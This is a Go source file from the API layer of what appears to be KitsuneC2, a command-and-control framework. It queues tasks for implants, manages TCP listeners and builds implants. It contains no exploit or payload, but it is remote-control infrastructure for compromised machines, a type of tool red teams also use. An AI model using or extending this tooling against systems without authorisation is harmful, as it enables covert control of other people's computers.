//This package is used by the CLI and web-api to make changes to application state.

package api

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"KitsuneC2/lib/utils"
	"KitsuneC2/server/builder"
	"KitsuneC2/server/db"
	"KitsuneC2/server/handlers"
	"KitsuneC2/server/listener"
	"encoding/json"
	"errors"
	"log"
	"math/rand"
	"reflect"
	"strconv"
	"time"
)

var runningsListeners []listener.Listener

// Adds a task to be executed for a specific implant. The taskArguments parameter should be a serializable type, see /lib/serializable
// to see the types of requests a server can make to the implant.
func AddTaskForImplant(implantId string, taskType int, taskArguments *communication.Task) (string, error) {
	//use reflection to check that taskType and taskArguments correspond
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[taskType]())
	actualType := reflect.TypeOf(*taskArguments).Elem()
	if !actualType.AssignableTo(expectedType) && !reflect.PointerTo(actualType).AssignableTo(expectedType) {
		return "", errors.New("taskType and taskArguments don't correspond")
	}
	rand.Uint32()
	id := cryptography.GenerateMd5FromStrings(implantId, strconv.FormatInt(time.Now().UnixNano(), 10))
	(*taskArguments).SetTaskId(id) //Set the taskId of the arguments.

	//Marshal the taskArguments so that the object can be stored in the database
	marshalledTaskData, err := json.Marshal(taskArguments)
	if err != nil {
		return "", err
	}
	var task *db.Implant_task = new(db.Implant_task)
	task.Implant_id = implantId
	task.Task_type = taskType
	task.Task_data = marshalledTaskData
	task.Completed = false
	task.Task_id = id

	err = db.AddTask(task)
	if err != nil {
		return "", err
	}
	return task.Task_id, nil
}

// Remove a task for an implant that is yet to be executed.
func RemovePendingTaskForImplant(implantId string, taskId string) error {
	err := db.RemovePendingTaskForImplant(implantId, taskId)
	return err
}

// Given an implantId, returns tasks belonging to this implant. The "completed" parameter determins whether the tasks returned
// have already been completed and thus have a result.
func GetTasksForImplant(implantId string, completed bool) ([]*db.Implant_task, error) {
	tasks, err := db.GetTasks(implantId, completed)
	if err != nil {
		return nil, err
	}

	return tasks, nil
}

// Given a task ID, returns all information about the task.
func GetTask(taskId string) (*db.Implant_task, error) {
	task, err := db.GetTask(taskId)
	if err != nil {
		return nil, err
	}

	return task, nil
}

// Checks if implant with implantId exists in our database
func ImplantExists(implantId string) bool {
	_, err := db.GetImplantInfo(implantId)
	if err != nil {
		if err == db.ErrNoResults {
			return false
		} else {
			log.Printf("[ERROR] encountered error while checking for existance of implant with ID: %s. Reason: %s ", implantId, err.Error())
		}
	}
	return true
}

// Returns information about all implants registered in the DB.
func GetAllImplants() ([]*db.Implant_info, error) {
	return db.GetAllImplants()
}

// Gets the "active" status from an implant
func GetImplantStatus(implantId string) (bool, error) {
	return db.GetImplantStatus(implantId)
}

// Starts a TCP listener on the specified port and network. E.g. network="127.0.0.1" port=4444. Leave network empty to listen
// on all available interfaces.
func AddListener(network string, port int) error {
	var ls listener.Listener = listener.Listener{Type: "tcp", Handler: handlers.TcpHandler, Network: network, Port: port}
	err := ls.Start()
	if err != nil {
		return err
	}

	runningsListeners = append(runningsListeners, ls)
	return nil
}

// Returns a list of all running jobs
func GetRunningListeners() (*[]listener.Listener, error) {
	if len(runningsListeners) == 0 {
		return nil, errors.New("no listeners running")
	}
	return &runningsListeners, nil
}

// Kills job with given ID.
func KillListener(listenerId int) error {
	if listenerId < 0 || listenerId >= len(runningsListeners) {
		return errors.New("no listener with that ID")
	}
	runningsListeners[listenerId].Stop()
	runningsListeners = append(runningsListeners[:listenerId], runningsListeners[listenerId+1:]...) //removes element from list and shifts other elements
	return nil
}

func BuildImplant(config *builder.BuilderConfig) error {
	if config.ImplantName == "" {
		config.ImplantName = utils.GenerateRandomName()
	}
	if config.ServerPort < 0 || config.ServerPort > 65535 {
		return errors.New("not a valid port number")
	}

	pub, err := db.GetPublicKey()
	if err != nil {
		log.Printf("Could not fetch public key from database while trying to build implant. Reason: %s", err.Error())
		return err
	}
	config.PublicKey = pub

	return builder.BuildImplant(config)
}
